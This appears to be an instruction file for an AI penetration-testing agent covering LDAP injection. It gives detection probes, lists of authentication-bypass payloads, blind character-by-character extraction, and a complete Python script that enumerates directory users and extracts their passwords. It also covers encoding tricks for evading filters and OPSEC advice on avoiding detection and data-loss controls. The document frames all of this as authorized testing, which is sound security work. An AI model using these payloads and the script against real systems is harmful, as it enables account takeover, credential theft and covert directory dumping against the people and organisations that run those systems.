---
name: ldap-injection
description: >
  Exploit LDAP injection vulnerabilities during authorized penetration
  testing.
keywords:
  - ldap injection
  - ldap filter injection
  - ldap auth bypass
  - ldap wildcard
  - ldap blind extraction
  - ldap search injection
  - active directory login bypass
  - ldap enumeration via injection
  - ldap attribute extraction
tools:
  - ldapsearch
  - burpsuite
  - curl
opsec: medium
---

# LDAP Injection

You are helping a penetration tester exploit LDAP injection vulnerabilities.
The target application passes user-controlled input into LDAP search filters
(RFC 4515) without proper sanitization. The goal is to bypass authentication,
extract directory data, or enumerate users and attributes. All testing is under
explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ldap-injection] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- An input field processed by an LDAP directory (login form, search field, user
  lookup, group membership check, address book)
- Common indicators: Active Directory or OpenLDAP backend, error messages
  mentioning `ldap_search`, `InvalidFilterException`, `Bad search filter`,
  `javax.naming.directory`, corporate intranet with directory-backed auth
- Proxy (Burp Suite) for intercepting and modifying requests

## Background: LDAP Filter Syntax

Understanding filter structure is critical for crafting injection payloads.

**RFC 4515 filter format:**
```
(attribute=value)              Simple match
(&(filter1)(filter2))          AND — both must match
(|(filter1)(filter2))          OR — either matches
(!(filter))                    NOT — negation
(attribute=val*)               Substring/wildcard match
(attribute>=value)             Greater-or-equal
(attribute<=value)             Less-or-equal
(attribute=*)                  Presence — attribute exists (any value)
```

**Special characters (must be escaped in safe input):**
```
*   → \2a   (wildcard)
(   → \28   (open paren)
)   → \29   (close paren)
\   → \5c   (backslash)
NUL → \00   (null byte)
```

**Common server-side filter templates (where injection occurs):**
```
# Login — AND filter with uid + password
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))

# Login — AD-style with sAMAccountName
(&(sAMAccountName=USER_INPUT)(userPassword=PASS_INPUT))

# Search — simple filter
(cn=SEARCH_INPUT)

# Search — OR filter
(|(cn=SEARCH_INPUT)(sn=SEARCH_INPUT))

# Group check
(&(objectClass=group)(cn=GROUP_INPUT))

# Address book lookup
(&(objectClass=person)(|(cn=INPUT)(mail=INPUT)))
```

Injection works by closing the current filter element and adding new conditions
that change the query logic.

## Step 1: Assess

If not already provided, determine:
1. **Injection context** — login form, search, lookup, or group check?
2. **Filter type** — AND `(&...)`, OR `(|...)`, or simple `(attr=...)`?
3. **Backend** — Active Directory, OpenLDAP, Oracle Internet Directory?
   - AD: look for domain\user format, sAMAccountName, NTLM references
   - OpenLDAP: look for uid, cn, POSIX attributes in errors
   - Oracle: look for orclGUID, OracleContext
4. **Error behavior** — does the app return LDAP errors or fail silently?

### Detection Probes

Inject into each input field and observe response changes:

```
*                    # Wildcard — if response changes, LDAP may be in play
)(cn=*))(|(cn=*      # Filter breakout — triggers error if filter is parsed
\                    # Backslash — may cause LDAP escape handling errors
```

**Error fingerprints that confirm LDAP backend:**
```
Bad search filter
Invalid filter
ldap_search
javax.naming.directory.InvalidSearchFilterException
LDAP error code 12
Inappropriate matching
NamingException
LdapErr: DSID-
```

If injecting `*` into a username field returns a valid login or different user,
LDAP injection is confirmed.

## Step 2: Authentication Bypass

The most common LDAP injection target. The server constructs an AND filter
like `(&(uid=INPUT)(userPassword=INPUT))` and checks if it returns a result.

### Wildcard Password Bypass

If the password field is interpolated directly:

```
# Server filter: (&(uid=INPUT)(userPassword=INPUT))
# Inject * as password — matches any password value
Username: admin
Password: *
# Resulting filter: (&(uid=admin)(userPassword=*))
# Matches admin with ANY password
```

This is the simplest test — try it first.

### Filter Breakout — AND Context

Close the current attribute, inject a true condition, comment out the rest:

```
# Server filter: (&(uid=INPUT)(userPassword=INPUT))

# Inject into username — close uid, add always-true, null-byte to truncate
Username: admin)(&)
Password: anything
# Resulting filter: (&(uid=admin)(&))(userPassword=anything))
# (&) is always true in some implementations

# Inject into username — close uid, inject wildcard objectClass
Username: admin)(objectClass=*
Password: anything
# Resulting filter: (&(uid=admin)(objectClass=*)(userPassword=anything))
# objectClass=* is always true — but password still checked

# Best: close the entire AND, start a new always-true filter
Username: admin)(%00
Password: anything
# Resulting filter: (&(uid=admin)(\00)(userPassword=anything))
# Null byte may truncate the filter after uid=admin
```

### Filter Breakout — OR Context

If the filter uses OR (common in search forms):

```
# Server filter: (|(cn=INPUT)(sn=INPUT))

# Inject into first field to match everything
Input: *)(objectClass=*
# Resulting filter: (|(cn=*)(objectClass=*)(sn=INPUT))
# objectClass=* matches every entry in the directory
```

### Comprehensive Auth Bypass Payloads

Try these against the username field (use any value for password):

```
*
admin*
*)(&
*)(|(&
admin)(&)
admin)(|(password=*
admin)(%26)
admin)(objectClass=*
admin))(|(uid=*
```

Try these against the password field (use `admin` or known username):

```
*
*)(&
*)(|(&
anything)(|(objectClass=*
```

### Login with Any Valid User (User Enumeration)

If `*` in username returns the first matching user:

```
Username: *        → logs in as first user in directory (often admin)
Username: a*       → first user starting with 'a'
Username: admin*   → matches 'admin', 'administrator', etc.
```

## Step 3: Blind Data Extraction

When injection works (response differs for match vs no-match) but data isn't
directly reflected. Extract values character by character using wildcards.

### Extract Password / Attribute Value

```
# Test first character of admin's password
admin)(userPassword=a*       → no match
admin)(userPassword=b*       → no match
...
admin)(userPassword=s*       → MATCH — first char is 's'

# Test second character
admin)(userPassword=sa*      → no match
admin)(userPassword=sb*      → no match
...
admin)(userPassword=se*      → MATCH — second char is 'e'

# Continue until no wildcard matches
admin)(userPassword=secret   → exact match confirms full value
```

### Automated Blind Extraction Script

```python
#!/usr/bin/env python3
"""LDAP blind attribute extraction via wildcard injection."""

import requests
import string
import sys
import urllib.parse

URL = "http://TARGET/login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
TARGET_USER = "admin"

# Charset — adjust based on target (AD passwords vs LDAP simple bind)
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*()-_=+"

# What indicates a successful match
SUCCESS_INDICATOR = "Welcome"  # or check status code, response size, redirect
def check(payload_user, payload_pass):
    """Send login request, return True if match."""
    data = {USERNAME_FIELD: payload_user, PASSWORD_FIELD: payload_pass}
    r = requests.post(URL, data=data, allow_redirects=False)
    return SUCCESS_INDICATOR in r.text or r.status_code == 302
def extract_attribute(target_user, attribute="userPassword"):
    """Extract attribute value character by character."""
    extracted = ""
    while True:
        found = False
        for c in CHARSET:
            # Inject: admin)(userPassword=extracted+c*
            payload = f"{target_user})({attribute}={extracted}{c}*"
            if check(payload, "anything"):
                extracted += c
                print(f"[+] {attribute}: {extracted}")
                found = True
                break
        if not found:
            break
    return extracted
def enumerate_users(prefix=""):
    """Discover usernames via uid wildcard brute-force."""
    users = []
    for c in string.ascii_lowercase + string.digits:
        test = prefix + c
        if check(f"{test}*", "*"):
            # This prefix matches at least one user — recurse
            deeper = enumerate_users(test)
            if deeper:
                users.extend(deeper)
            else:
                users.append(test)
    if not users and prefix:
        users.append(prefix)
    return users
if __name__ == "__main__":
    print("[*] Enumerating users...")
    users = enumerate_users()
    for u in users:
        print(f"[+] User: {u}")
        pwd = extract_attribute(u, "userPassword")
        print(f"    Password: {pwd}")
```

### Extracting Other Attributes

Valuable attributes to extract via blind injection:

| Attribute | Value |
|-----------|-------|
| `userPassword` | Password (LDAP simple bind) |
| `description` | Often contains notes, sometimes passwords — check early |
| `mail` | Email address (phishing, password resets) |
| `telephoneNumber` | Phone number (social engineering, MFA bypass) |
| `memberOf` | Group memberships — identify Domain Admins, privileged groups |
| `sAMAccountName` | AD username |
| `userPrincipalName` | UPN — user@domain format |
| `uid` | Unix/LDAP username |
| `adminCount` | AD admin flag (1 = privileged account) |
| `servicePrincipalName` | SPNs — Kerberoasting targets |
| `homeDirectory` | Home path (may reveal OS info, network shares) |
| `sshPublicKey` | SSH public key (OpenLDAP with openssh-lpk) |
| `pwdLastSet` | Password age — find stale passwords |
| `userAccountControl` | Account flags — find no-preauth (AS-REP roastable) |

Adapt the blind extraction script — change the `attribute` parameter:

```
# Extract email
admin)(mail=a*
admin)(mail=ab*
...

# Extract description
admin)(description=a*
...

# Check group membership
admin)(memberOf=CN=Domain Admins*
```

## Step 4: Attribute Discovery

When you don't know which attributes exist, enumerate them using the presence
operator `(attribute=*)`:

```
# Test if attribute exists for a user
admin)(mail=*             → MATCH means mail attribute exists
admin)(telephoneNumber=*  → no match means attribute not set
admin)(description=*      → MATCH means description is populated
admin)(sshPublicKey=*     → test for SSH key storage
```

**Common attributes to probe:**

```
uid, cn, sn, givenName, displayName, mail, userPassword,
telephoneNumber, mobile, description, title, department,
memberOf, sAMAccountName, userPrincipalName, homeDirectory,
loginShell, uidNumber, gidNumber, objectClass, sshPublicKey
```

## Step 5: Advanced Techniques

### Null Byte Truncation

Some LDAP libraries (especially older ones or those using C bindings) truncate
the filter at a null byte:

```
# Server filter: (&(uid=INPUT)(userPassword=INPUT))
Username: admin)%00
Password: anything
# Resulting filter: (&(uid=admin)\00)(userPassword=anything))
# If truncated: (&(uid=admin)  → matches admin regardless of password
```

Works on: older PHP ldap_search(), some Java JNDI implementations, C-based
LDAP clients. Does NOT work on modern implementations that handle null bytes.

### Hex-Encoded Bypass

If the app filters `*` or `(` but not hex escapes:

```
\2a          → *
\28          → (
\29          → )
\5c          → \
\00          → NUL
```

Example:
```
Username: admin\29\28objectClass=\2a
# Decoded: admin)(objectClass=*
```

### Double URL Encoding

If the app URL-decodes once but LDAP processes the second encoding:

```
%252a        → %2a → *
%2528        → %28 → (
%2529        → %29 → )
```

### Injection via HTTP Headers

Some apps pass headers to LDAP queries (X-Forwarded-For for logging,
Authorization for LDAP bind):

```
X-Forwarded-User: admin)(objectClass=*
Authorization: Basic YWRtaW4pKG9iamVjdENsYXNzPSo=
# Base64 of: admin)(objectClass=*
```

### OR-Based Data Dumping

In search contexts with OR filters, inject to return all entries:

```
# Server filter: (|(cn=INPUT)(sn=INPUT))
# Inject to match everything:
Input: *)(objectClass=*
# Result: (|(cn=*)(objectClass=*)(sn=INPUT))
# Returns every object in the search base
```

If the app displays results, this dumps the directory.

## Step 6: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- Wildcard queries (`*`) are common in normal LDAP operations — low detection
  risk for simple injection tests
- Blind extraction generates many sequential requests — may trigger rate
  limiting or anomaly detection. Add delays to extraction scripts.
- Malformed filters cause LDAP errors that are logged server-side — noisy if
  many injection attempts fail
- Null byte injection may crash poorly written LDAP clients — test cautiously
  on production systems
- Extracted data (passwords, emails, group memberships) may trigger DLP if
  exfiltrated from the network

## Troubleshooting

### Wildcard (*) Not Working

- Application may sanitize `*` — try hex encoding: `\2a`
- Password field may use LDAP `bind()` instead of `compare()` — bind
  operations don't support wildcards. Try filter breakout instead.
- Some directories store hashed passwords — wildcard matches the hash
  string, not the plaintext. Blind extraction gives you the hash.

### Filter Breakout Payloads Cause Errors

- Count parentheses carefully — the resulting filter must be syntactically
  valid or the server rejects it entirely
- Try different closing patterns:
  ```
  admin)(&)                    # Close + always-true AND
  admin)(|(uid=*)              # Close + always-true OR
  admin))%00                   # Close + null truncation
  admin)(objectClass=*))(&)(|( # Balance all parens
  ```
- Some servers are strict about filter syntax — use Burp Intruder to
  systematically test breakout patterns

### Blind Extraction Returns No Results

- Charset may be wrong — try uppercase, special characters, non-ASCII
- Attribute may not exist for that user — test with `(attribute=*)` first
- Attribute may be binary (e.g., hashed password) — try hex charset
- Response indicator may be unreliable — compare response sizes instead
  of searching for specific strings
- Some directories restrict which attributes are readable — `userPassword`
  is often ACL-protected in production LDAP

### Cannot Determine Filter Context

- Inject `)(` — if error mentions "unbalanced parentheses", it's a filter
- Inject `*` alone — if behavior changes, wildcard matching is active
- Inject `admin)(&)(|(`  — if error, you're inside a complex filter
- Check for multiple input fields processed together (username + password)
  vs single field (search box) — this determines AND vs simple filter

### LDAP Bind vs Search

Important distinction:
- **LDAP search** with filter: `(&(uid=INPUT)(userPassword=INPUT))` → injectable
- **LDAP bind**: `ldap_bind(dn, password)` → password is NOT in a filter,
  only the DN construction may be injectable
- If password wildcards don't work but username injection does, the app
  likely uses bind for authentication. Focus on username field injection
  and DN manipulation.
